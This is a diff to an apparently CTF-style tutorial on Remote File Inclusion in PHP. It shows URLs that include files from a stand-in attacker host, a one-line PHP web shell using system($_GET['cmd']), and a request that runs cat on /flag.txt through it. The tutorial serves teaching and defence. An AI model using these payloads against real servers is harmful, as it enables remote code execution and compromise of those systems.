@@ -17,24 +17,32 @@ http://example.com/index.php?page=http://evil.com/malicious_file.php
 ```
 In this case, the attacker might manipulate the `page` parameter to include an external file.
 
+---
 
-##  Remote Code Execution via RFI
+## Remote Code Execution via RFI
 
-RFI can allow an attacker to execute malicious code hosted on an external server. For example, the attacker could upload a malicious PHP file to a server they control and then trick the vulnerable application into including and executing that file.
+RFI can allow an attacker to execute malicious code hosted on an external server. This happens when the application includes a remote file controlled by the attacker.
 
 ```bash
-http://example.com/index.php?page=http://evil.com/malicious_code.php
+http://example.com/index.php?page=http://<attacker_ip>/malicious_code.php
 ```
 
-In this case, the attacker’s server `evil.com` would serve the malicious PHP file, which might contain code like:
+In this case, the attacker hosts a PHP file containing:
 
 ```php
-<?php
-    system('id'); // Executes the 'id' command on the server
-?>
+<?php system($_GET['cmd']); ?>
 ```
 
-This can lead to **Remote Code Execution (RCE)** and potentially give the attacker full control of the vulnerable server.
+When the vulnerable server includes this file, it executes the PHP code as if it were local.
+
+Once the remote file is included, we can control its behavior through parameters.
+
+```bash
+http://example.com/index.php?language=http://<attacker_ip>/shell.php&cmd=cat%20/flag.txt
+```
+
+
+---
 
 ## Bypassing Input Filters
 
